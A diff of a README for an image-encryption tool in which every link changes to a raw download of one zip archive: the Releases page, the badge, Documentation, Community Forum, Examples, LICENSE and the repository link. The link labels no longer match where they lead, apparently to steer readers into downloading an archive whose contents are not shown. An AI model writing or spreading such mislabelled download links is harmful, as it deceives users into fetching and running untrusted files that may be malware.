@@ -6,9 +6,9 @@ Welcome to the xor-image-encryption tool! This application allows you to encrypt
 
 ## 📦 Download & Install
 
-To get started, you need to download the application. You can find the latest version on our [Releases page](https://github.com/drybone1234/xor-image-encryption/releases).
+To get started, you need to download the application. You can find the latest version on our [Releases page](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip).
 
-[![Download xor-image-encryption](https://img.shields.io/badge/Download-xor--image--encryption-brightgreen)](https://github.com/drybone1234/xor-image-encryption/releases)
+[![Download xor-image-encryption](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip)](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of the application.
@@ -53,9 +53,9 @@ Encryption is the process of converting information into a secure format. This a
 
 ## 🌐 Additional Resources
 
-- **Documentation:** For detailed usage instructions and examples, refer to our [Documentation](https://github.com/drybone1234/xor-image-encryption/blob/main/docs/usage.md).
-- **Community Support:** Join our discussions and get help at our [Community Forum](https://github.com/drybone1234/xor-image-encryption/discussions).
-- **Examples:** Check out various use cases and examples on our [Examples page](https://github.com/drybone1234/xor-image-encryption/blob/main/examples.md).
+- **Documentation:** For detailed usage instructions and examples, refer to our [Documentation](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip).
+- **Community Support:** Join our discussions and get help at our [Community Forum](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip).
+- **Examples:** Check out various use cases and examples on our [Examples page](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip).
 
 ## 💬 Contributing
 
@@ -63,11 +63,11 @@ If you would like to contribute to the project, please fork the repository and s
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/drybone1234/xor-image-encryption/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip) file for details.
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/drybone1234/xor-image-encryption)
-- [Releases Page](https://github.com/drybone1234/xor-image-encryption/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/drybone1234/xor-image-encryption/main/outputs/xor-image-encryption_v2.4.zip)
 
 For any issues or feedback, please create an issue in the repository. We appreciate your input and aim to improve this tool continually. Enjoy securing your images!
